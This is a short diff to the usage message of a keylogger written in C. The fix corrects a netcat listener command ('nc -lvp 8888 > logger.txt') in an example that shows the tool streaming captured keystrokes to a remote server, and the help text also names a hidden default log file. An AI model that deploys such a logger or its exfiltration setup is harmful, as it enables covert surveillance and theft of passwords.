@@ -476,7 +476,7 @@ int main(int argc, char** argv)
 		fprintf(stderr,"\nOPTIONS:\n\t-d <input-device>:\t\t\tIf not specified, the default device is '/dev/input/by-path/***kbd'\n");
 		fprintf(stderr,"\t-o <output-file>:\t\t\tIt can be used only if '-m remote' option is not specified. The default output file is '/tmp/.logger.txt'\n");
 		fprintf(stderr,"\t-m remote -a <IP-ADDR> -p <PORT>:\tIt sends all the keystrokes on the remote server located at <IP-ADDR:PORT>\n");
-		fprintf(stderr,"\nEXAMPLE:\n\tServer$ nc lvp 8888 > logger.txt\n\tClient#%s -m remote -a 127.0.0.1 -p 8888\n", argv[0]);
+		fprintf(stderr,"\nEXAMPLE:\n\tServer$ nc -lvp 8888 > logger.txt\n\tClient#%s -m remote -a 127.0.0.1 -p 8888\n", argv[0]);
 		exit(0);
 	}
 	
